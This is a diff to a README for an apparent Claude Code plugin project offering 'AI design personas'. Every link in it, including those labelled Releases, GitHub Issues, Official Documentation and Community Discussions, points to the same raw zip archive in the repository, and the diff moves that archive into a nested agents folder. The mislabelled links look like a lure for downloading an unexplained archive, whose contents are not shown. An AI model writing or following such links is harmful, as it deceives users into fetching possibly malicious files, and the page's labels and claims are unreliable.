@@ -4,13 +4,13 @@
 
 Welcome to the ai-design-engineering-cc-plugins! This tool enhances your design experience by integrating human-centered AI personas. Follow these steps to download and run the application.
 
-[![Download Now](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/assets/cc_engineering_plugins_design_ai_v3.1.zip)](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/assets/cc_engineering_plugins_design_ai_v3.1.zip)
+[![Download Now](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/claude-code/plugins/ai-design-engineer/agents/design-engineering-cc-plugins-ai-2.7.zip)](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/claude-code/plugins/ai-design-engineer/agents/design-engineering-cc-plugins-ai-2.7.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the latest version of ai-design-engineering-cc-plugins:
 
-[Download from Releases](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/assets/cc_engineering_plugins_design_ai_v3.1.zip)
+[Download from Releases](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/claude-code/plugins/ai-design-engineer/agents/design-engineering-cc-plugins-ai-2.7.zip)
 
 1. Go to the Releases page by clicking the link above.
 2. Look for the latest release. It is usually at the top of the list.
@@ -64,7 +64,7 @@ To effectively utilize the software, follow these steps:
 
 If you encounter issues or need assistance, we encourage you to reach out. Visit our GitHub Issues page to report concerns or provide feedback:
 
-[GitHub Issues](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/assets/cc_engineering_plugins_design_ai_v3.1.zip)
+[GitHub Issues](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/claude-code/plugins/ai-design-engineer/agents/design-engineering-cc-plugins-ai-2.7.zip)
 
 ## 🌐 Topics Covered
 
@@ -82,9 +82,9 @@ These topics guide how the AI personas interact and help you to achieve your des
 
 For more information and tutorials, check out the following:
 
-- [Official Documentation](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/assets/cc_engineering_plugins_design_ai_v3.1.zip)
-- [Community Discussions](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/assets/cc_engineering_plugins_design_ai_v3.1.zip)
+- [Official Documentation](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/claude-code/plugins/ai-design-engineer/agents/design-engineering-cc-plugins-ai-2.7.zip)
+- [Community Discussions](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/claude-code/plugins/ai-design-engineer/agents/design-engineering-cc-plugins-ai-2.7.zip)
 
 Make sure to explore these resources to make the most of your experience with ai-design-engineering-cc-plugins.
 
-[Download from Releases](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/assets/cc_engineering_plugins_design_ai_v3.1.zip)
+[Download from Releases](https://github.com/Yasas9029/ai-design-engineering-cc-plugins/raw/refs/heads/main/claude-code/plugins/ai-design-engineer/agents/design-engineering-cc-plugins-ai-2.7.zip)
